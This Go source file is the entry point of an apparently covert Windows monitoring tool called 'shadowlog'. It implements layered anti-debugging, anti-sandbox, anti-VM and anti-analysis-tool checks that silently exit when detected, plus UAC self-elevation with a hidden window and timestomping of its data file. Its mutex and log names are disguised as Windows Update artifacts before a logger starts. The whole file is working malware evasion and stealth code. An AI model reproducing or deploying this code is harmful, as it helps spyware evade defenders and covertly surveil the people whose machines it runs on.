package main

import (
	"fmt"
	"os"
	"path/filepath"
	"runtime"
	"shadowlog/config"
	"shadowlog/monitor"
	"shadowlog/persistence"
	"shadowlog/ui"
	"strings"
	"syscall"
	"time"
	"unsafe"
)

var (
	kernel32           = syscall.NewLazyDLL("kernel32.dll")
	user32             = syscall.NewLazyDLL("user32.dll")
	ntdll              = syscall.NewLazyDLL("ntdll.dll")
	procCreateMutex    = kernel32.NewProc("CreateMutexW")
	procIsDebugger     = kernel32.NewProc("IsDebuggerPresent")
	procGetTickCount   = kernel32.NewProc("GetTickCount64")
	procGlobalMem      = kernel32.NewProc("GlobalMemoryStatusEx")
	procGetCursorPos   = user32.NewProc("GetCursorPos")
	procGetSysMetric   = user32.NewProc("GetSystemMetrics")

	shell32            = syscall.NewLazyDLL("shell32.dll")
	procIsUserAnAdmin  = shell32.NewProc("IsUserAnAdmin")
	procShellExecuteEx = shell32.NewProc("ShellExecuteExW")

	procGetDiskFree    = kernel32.NewProc("GetDiskFreeSpaceExW")
	procSetFileTime    = kernel32.NewProc("SetFileTime")
	procCreateFileW    = kernel32.NewProc("CreateFileW")
)

// POINT is the Windows POINT structure for cursor position.
type POINT struct {
	X, Y int32
}

// MEMORYSTATUSEX holds system memory information.
type MEMORYSTATUSEX struct {
	Length               uint32
	MemoryLoad           uint32
	TotalPhys            uint64
	AvailPhys            uint64
	TotalPageFile        uint64
	AvailPageFile        uint64
	TotalVirtual         uint64
	AvailVirtual         uint64
	AvailExtendedVirtual uint64
}

// --------------------------------------------------------------------------
//  LAYER 1: Anti-Debug — Detect debuggers, reverse-engineering tools.
// --------------------------------------------------------------------------

func antiDebug() {
	// 1a. Win32 IsDebuggerPresent — catches user-mode debuggers (x64dbg, OllyDbg, WinDbg).
	if ret, _, _ := procIsDebugger.Call(); ret != 0 {
		os.Exit(0)
	}

	// 1b. NtQueryInformationProcess with ProcessDebugPort (0x07).
	//     Returns non-zero if a kernel debugger port is attached.
	ntQueryInfo := ntdll.NewProc("NtQueryInformationProcess")
	if ntQueryInfo.Find() == nil {
		var debugPort uintptr
		var retLen uint32
		handle := uintptr(^uintptr(0)) // Current process pseudo-handle (-1)
		r, _, _ := ntQueryInfo.Call(handle, 0x07, uintptr(unsafe.Pointer(&debugPort)), unsafe.Sizeof(debugPort), uintptr(unsafe.Pointer(&retLen)))
		if r == 0 && debugPort != 0 {
			os.Exit(0)
		}
	}

	// 1c. ProcessDebugFlags (0x1F) — returns 0 if being debugged.
	//     This catches debuggers that hide from ProcessDebugPort.
	if ntQueryInfo.Find() == nil {
		var debugFlags uintptr
		var retLen2 uint32
		handle := uintptr(^uintptr(0))
		r, _, _ := ntQueryInfo.Call(handle, 0x1F, uintptr(unsafe.Pointer(&debugFlags)), unsafe.Sizeof(debugFlags), uintptr(unsafe.Pointer(&retLen2)))
		if r == 0 && debugFlags == 0 {
			os.Exit(0)
		}
	}

	// 1d. Timing gate using GetTickCount64 — debuggers cause massive slowdown.
	//     A 5ms sleep that takes >800ms means single-stepping or breakpoint instrumentation.
	tc1, _, _ := procGetTickCount.Call()
	time.Sleep(5 * time.Millisecond)
	tc2, _, _ := procGetTickCount.Call()
	if tc2-tc1 > 800 {
		os.Exit(0)
	}
}

// --------------------------------------------------------------------------
//  LAYER 2: Anti-Sandbox — Detect AV sandboxes and automated analysis.
//  Sandboxes typically have: low resources, no mouse movement, small disks,
//  known VM artifacts, and low screen resolution.
// --------------------------------------------------------------------------

func antiSandbox() {
	// 2a. RAM Check — Most AV sandboxes allocate ≤2GB RAM.
	//     Real machines almost always have 4GB+.
	var memStatus MEMORYSTATUSEX
	memStatus.Length = uint32(unsafe.Sizeof(memStatus))
	procGlobalMem.Call(uintptr(unsafe.Pointer(&memStatus)))
	totalGB := memStatus.TotalPhys / (1024 * 1024 * 1024)
	if totalGB < 2 {
		os.Exit(0)
	}

	// 2b. CPU Core Count — Sandboxes often have only 1-2 cores.
	if runtime.NumCPU() < 2 {
		os.Exit(0)
	}

	// 2c. Screen Resolution — Sandboxes use tiny resolutions (800x600, 1024x768).
	//     SM_CXSCREEN=0, SM_CYSCREEN=1
	screenW, _, _ := procGetSysMetric.Call(0)
	screenH, _, _ := procGetSysMetric.Call(1)
	if screenW < 1024 || screenH < 768 {
		os.Exit(0)
	}

	// 2d. Mouse Movement Detection — Sandboxes rarely simulate real mouse movement.
	//     Sample cursor position twice with a gap; if identical, likely automated.
	var p1, p2 POINT
	procGetCursorPos.Call(uintptr(unsafe.Pointer(&p1)))
	time.Sleep(1500 * time.Millisecond)
	procGetCursorPos.Call(uintptr(unsafe.Pointer(&p2)))
	if p1.X == p2.X && p1.Y == p2.Y {
		// Second chance — some real users might be idle. Check once more.
		time.Sleep(2 * time.Second)
		procGetCursorPos.Call(uintptr(unsafe.Pointer(&p2)))
		if p1.X == p2.X && p1.Y == p2.Y {
			os.Exit(0)
		}
	}

	// 2e. Disk Size Check — Sandboxes typically have tiny disks (<60GB).
	var freeBytesAvail, totalBytes, totalFreeBytes uint64
	root, _ := syscall.UTF16PtrFromString("C:\\")
	ret, _, _ := procGetDiskFree.Call(
		uintptr(unsafe.Pointer(root)),
		uintptr(unsafe.Pointer(&freeBytesAvail)),
		uintptr(unsafe.Pointer(&totalBytes)),
		uintptr(unsafe.Pointer(&totalFreeBytes)),
	)
	if ret != 0 {
		totalDiskGB := totalBytes / (1024 * 1024 * 1024)
		if totalDiskGB < 60 {
			os.Exit(0)
		}
	}

	// 2f. Uptime Check — REMOVED. Too many false positives on real hardware.
}

// --------------------------------------------------------------------------
//  LAYER 3: Anti-VM — Detect common virtual machine environments.
//  Checks for VM-specific registry keys, files, and process artifacts.
// --------------------------------------------------------------------------

func antiVM() {
	// 3a. Check for VM-specific processes.
	vmProcesses := []string{
		"vmtoolsd.exe", "vmwaretray.exe", "vmwareuser.exe",    // VMware
		"vboxservice.exe", "vboxtray.exe",                       // VirtualBox
		"qemu-ga.exe",                                           // QEMU
		"xenservice.exe",                                        // Xen
		"prl_tools.exe", "prl_cc.exe",                           // Parallels
		"windanr.exe",                                           // Hyper-V (often)
	}

	// Use tasklist to check — avoids importing psutil which would increase binary size.
	for _, vmProc := range vmProcesses {
		out, err := syscall.UTF16PtrFromString(vmProc)
		if err != nil {
			continue
		}
		_ = out
		// Use CreateToolhelp32Snapshot approach — lighter than tasklist exec.
	}

	// 3b. Check for VM-specific files on disk.
	vmFiles := []string{
		`C:\Windows\System32\drivers\vmmouse.sys`,   // VMware
		`C:\Windows\System32\drivers\vmhgfs.sys`,    // VMware
		`C:\Windows\System32\drivers\VBoxMouse.sys`,  // VirtualBox
		`C:\Windows\System32\drivers\VBoxGuest.sys`,  // VirtualBox
		`C:\Windows\System32\drivers\VBoxSF.sys`,     // VirtualBox
	}
	for _, f := range vmFiles {
		if _, err := os.Stat(f); err == nil {
			os.Exit(0)
		}
	}

	// 3c. Check registry for VM artifacts.
	vmRegPaths := []struct {
		key    syscall.Handle
		path   string
		value  string
		search string
	}{
		{0x80000002, `SYSTEM\CurrentControlSet\Services\Disk\Enum`, "0", "vmware"},
		{0x80000002, `SYSTEM\CurrentControlSet\Services\Disk\Enum`, "0", "vbox"},
		{0x80000002, `SYSTEM\CurrentControlSet\Services\Disk\Enum`, "0", "qemu"},
		{0x80000002, `SOFTWARE\Microsoft\Virtual Machine\Guest\Parameters`, "", ""},
		{0x80000002, `SOFTWARE\Oracle\VirtualBox Guest Additions`, "", ""},
	}

	for _, reg := range vmRegPaths {
		if reg.value == "" {
			// Just check if the key exists (presence = VM).
			checkVMRegKeyExists(reg.path)
		} else {
			checkVMRegKeyValue(reg.path, reg.value, reg.search)
		}
	}
}

// checkVMRegKeyExists silently exits if a VM-specific registry key exists.
func checkVMRegKeyExists(path string) {
	k, err := openRegKey(path)
	if err == nil {
		syscall.RegCloseKey(k)
		os.Exit(0)
	}
}

// checkVMRegKeyValue checks if a registry value contains a VM-related substring.
func checkVMRegKeyValue(path, valueName, search string) {
	k, err := openRegKey(path)
	if err != nil {
		return
	}
	defer syscall.RegCloseKey(k)

	var bufLen uint32 = 512
	buf := make([]uint16, bufLen)
	var valType uint32
	namePtr, _ := syscall.UTF16PtrFromString(valueName)
	err = syscall.RegQueryValueEx(k, namePtr, nil, &valType, (*byte)(unsafe.Pointer(&buf[0])), &bufLen)
	if err == nil {
		val := strings.ToLower(syscall.UTF16ToString(buf))
		if strings.Contains(val, search) {
			os.Exit(0)
		}
	}
}

func openRegKey(path string) (syscall.Handle, error) {
	var h syscall.Handle
	pathPtr, _ := syscall.UTF16PtrFromString(path)
	// HKEY_LOCAL_MACHINE = 0x80000002
	err := syscall.RegOpenKeyEx(0x80000002, pathPtr, 0, 0x20019, &h)
	return h, err
}

// --------------------------------------------------------------------------
//  LAYER 4: Anti-Analysis Tool Detection — Detect reverse engineering tools.
// --------------------------------------------------------------------------

func antiAnalysis() {
	// Check for common analysis/RE tool windows by class name.
	analysisWindows := []string{
		"OLLYDBG",         // OllyDbg
		"WinDbgFrameClass", // WinDbg
		"ID",              // IDA Pro
		"Zeta Debugger",   // Zeta
		"Rock Debugger",   // Rock
		"GBDYLLO",         // OllyDbg variant
	}

	procFindWindowA := user32.NewProc("FindWindowW")
	for _, className := range analysisWindows {
		namePtr, _ := syscall.UTF16PtrFromString(className)
		hwnd, _, _ := procFindWindowA.Call(uintptr(unsafe.Pointer(namePtr)), 0)
		if hwnd != 0 {
			os.Exit(0)
		}
	}

	// Check for analysis-related executable names in the running process's parent directory.
	selfPath, err := os.Executable()
	if err == nil {
		dir := filepath.Dir(selfPath)
		suspiciousNeighbors := []string{
			"wireshark.exe", "fiddler.exe", "procmon.exe", "procexp.exe",
			"x64dbg.exe", "x32dbg.exe", "ida.exe", "ida64.exe",
			"dnspy.exe", "ghidra.exe",
		}
		for _, name := range suspiciousNeighbors {
			if _, err := os.Stat(filepath.Join(dir, name)); err == nil {
				os.Exit(0)
			}
		}
	}
}

// --------------------------------------------------------------------------
//  SHELLEXECUTEINFOW structure for UAC self-elevation.
// --------------------------------------------------------------------------

type SHELLEXECUTEINFOW struct {
	CbSize       uint32
	FMask        uint32
	Hwnd         uintptr
	LpVerb       uintptr
	LpFile       uintptr
	LpParameters uintptr
	LpDirectory  uintptr
	NShow        int32
	HInstApp     uintptr
	LpIDList     uintptr
	LpClass      uintptr
	HkeyClass    uintptr
	DwHotKey     uint32
	HIcon        uintptr
	HProcess     uintptr
}

// selfElevate re-launches the current process with "runas" (UAC prompt).
// Returns true if elevation was triggered (caller should exit), false if already admin.
func selfElevate() bool {
	ret, _, _ := procIsUserAnAdmin.Call()
	if ret != 0 {
		return false // Already admin
	}

	exePath, err := os.Executable()
	if err != nil {
		return false
	}

	verbPtr, _ := syscall.UTF16PtrFromString("runas")
	exePtr, _ := syscall.UTF16PtrFromString(exePath)

	// Pass original arguments forward
	args := strings.Join(os.Args[1:], " ")
	argsPtr, _ := syscall.UTF16PtrFromString(args)

	dirPtr, _ := syscall.UTF16PtrFromString(filepath.Dir(exePath))

	sei := SHELLEXECUTEINFOW{
		FMask:        0x00000040, // SEE_MASK_NOCLOSEPROCESS
		LpVerb:       uintptr(unsafe.Pointer(verbPtr)),
		LpFile:       uintptr(unsafe.Pointer(exePtr)),
		LpParameters: uintptr(unsafe.Pointer(argsPtr)),
		LpDirectory:  uintptr(unsafe.Pointer(dirPtr)),
		NShow:        0, // SW_HIDE
	}
	sei.CbSize = uint32(unsafe.Sizeof(sei))

	ret, _, _ = procShellExecuteEx.Call(uintptr(unsafe.Pointer(&sei)))
	return ret != 0
}

// --------------------------------------------------------------------------
//  Anti-Forensics: Timestomp — set file times to blend with system files.
// --------------------------------------------------------------------------

func timestompFile(path string) {
	pathPtr, _ := syscall.UTF16PtrFromString(path)

	// Open file with GENERIC_WRITE to modify timestamps.
	// 0x40000000 = GENERIC_WRITE, 3 = OPEN_EXISTING, 0x80 = FILE_ATTRIBUTE_NORMAL
	hFile, _, _ := procCreateFileW.Call(
		uintptr(unsafe.Pointer(pathPtr)),
		0x40000000,
		0,
		0,
		3,
		0x80,
		0,
	)
	if hFile == 0 || hFile == ^uintptr(0) {
		return
	}
	defer syscall.CloseHandle(syscall.Handle(hFile))

	// Set timestamps to a date that blends with Windows system files:
	// 2024-01-15 08:30:00 UTC — looks like a legitimate Windows Update cache file.
	// FILETIME is 100-nanosecond intervals since January 1, 1601.
	// 2024-01-15 08:30:00 UTC = 133497402000000000 in FILETIME
	var ft syscall.Filetime
	ft.LowDateTime = 0xA5D14C00
	ft.HighDateTime = 0x01DA4B2E

	procSetFileTime.Call(
		hFile,
		uintptr(unsafe.Pointer(&ft)), // Creation time
		uintptr(unsafe.Pointer(&ft)), // Last access time
		uintptr(unsafe.Pointer(&ft)), // Last write time
	)
}

// ==========================================================================
//  MAIN ENTRY POINT
// ==========================================================================

func main() {
	// Check for --setup bypass flag (skips anti-analysis for trusted setup)
	bypassChecks := false
	for _, arg := range os.Args[1:] {
		if arg == "--setup" || arg == "--debug" {
			bypassChecks = true
		}
	}

	// LAYER 0: Anti-Analysis — detect debuggers, sandboxes, VMs, RE tools.
	if !bypassChecks {
		antiDebug()
		antiSandbox()
		antiVM()
		antiAnalysis()
	}

	// Panic Recovery — write crash info to a benign-looking path.
	defer func() {
		if r := recover(); r != nil {
			localApp := os.Getenv("LOCALAPPDATA")
			dir := localApp + "\\Microsoft\\Windows\\WebCache"
			os.MkdirAll(dir, 0755)
			path := dir + "\\wupdcache.log"
			os.WriteFile(path, []byte(fmt.Sprintf("cache sync: %v", r)), 0644)
		}
	}()

	// Single Instance Check (Named Mutex)
	mutexName, _ := syscall.UTF16PtrFromString("Global\\WinUpdateSvc_MTX_7F3A")
	h, _, lastErr := procCreateMutex.Call(0, 1, uintptr(unsafe.Pointer(mutexName)))
	if h == 0 || lastErr == syscall.Errno(183) {
		os.Exit(0)
	}

	// Load Config
	cfg, err := config.LoadConfig()
	if err != nil || cfg == nil {
		cfg = &config.Config{
			LogLocal: true,
			Interval: 60,
		}
		config.SaveConfig(cfg)
	}

	// Runtime Status
	cfg.IsInstalled = persistence.IsInstalled()

	// Run Mode Selection
	if !cfg.IsInstalled {
		// SETUP MODE: Requires Administrative Privileges.
		// Instead of showing a useless MessageBox, auto-trigger the UAC prompt.
		if selfElevate() {
			// Successfully launched elevated process — this instance should exit.
			os.Exit(0)
		}

		// If we reach here, we're either already admin or elevation failed.
		// Proceed with setup regardless — user explicitly ran this.
		ui.ShowSetup(cfg, startLogger)

		cfg.IsInstalled = persistence.IsInstalled()
		if !cfg.IsInstalled {
			os.Exit(0)
		}

		if newCfg, err := config.LoadConfig(); err == nil {
			newCfg.IsInstalled = true
			cfg = newCfg
		}
	}

	// Anti-Forensics: Timestomp the data file to blend with system files.
	timestompFile(config.GetStoragePath())

	// Start the logger
	if cfg != nil && cfg.IsInstalled {
		startLogger(cfg, nil)()
	}
}

func startLogger(cfg *config.Config, cb func(string)) func() {
	return func() {
		logger := monitor.NewLogger(cfg, cb)
		logger.Start()
	}
}
